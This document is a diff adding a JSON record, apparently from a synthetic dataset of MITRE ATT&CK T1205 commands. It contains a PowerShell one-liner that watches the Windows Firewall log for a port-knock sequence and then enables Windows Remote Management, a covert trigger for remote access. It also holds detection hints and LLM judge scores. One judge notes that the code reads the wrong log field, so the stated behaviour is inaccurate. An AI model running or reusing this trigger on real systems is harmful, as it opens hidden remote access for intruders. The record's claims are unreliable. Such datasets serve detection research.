@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall set currentprofile logging droppedconnections enable;$log=\"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\";$seq=@(7001,7002,7003);$state=@{};Get-Content $log -Wait | Where-Object {$_ -and ($_ -notmatch '^#')} | ForEach-Object{ $f=$_ -split '\\s+'; if($f.Length -ge 9 -and $f[2] -eq 'DROP'){ $src=$f[4]; $dstPort=[int]$f[8]; $idx=[array]::IndexOf($seq,$dstPort); if($idx -ge 0 -and ( ($idx -eq 0) -or ($state[$src] -eq ($idx-1)) )){ $state[$src]=$idx; if($state[$src] -eq ($seq.Count-1)){ & netsh advfirewall firewall set rule group=\"Windows Remote Management\" new enable=yes; break } } } }",
+  "explanation": "Enables Windows Firewall dropped-packet logging, tails the log for a specific three-port knock sequence (UDP to 7001/7002/7003) from the same source, then enables the 'Windows Remote Management' firewall group via netsh. Requires Administrator.",
+  "rationale_steps": [
+    "Turn on firewall drop logging and stream the log in real time.",
+    "Parse for a specific destination port sequence from a single IP to act as a covert trigger.",
+    "Detection: monitor changes to firewall logging settings, tailing of pfirewall.log by suspicious processes, and WinRM firewall group state transitions (Event IDs 4946-4951)."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-3a33ff40",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell command is well-formed with balanced braces, valid piping, and correctly quoted netsh arguments.",
+        "semantic_score": 3,
+        "semantic_justification": "Conceptually aligns with Traffic Signaling via port-knock detection and trigger, but it indexes the firewall log's size field instead of destination port (uses f[8] instead of f[7]) and doesn't enforce UDP, making the trigger unlikely to work as described.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T18:09:52.939286Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid PowerShell syntax, operators, control flow, and external command execution with correct parameter formatting.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly implements a sequence-based port knock using Windows Firewall logging as a trigger, perfectly aligning with the T1205 Traffic Signaling technique to enable a remote management firewall rule.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T18:10:09.457072Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
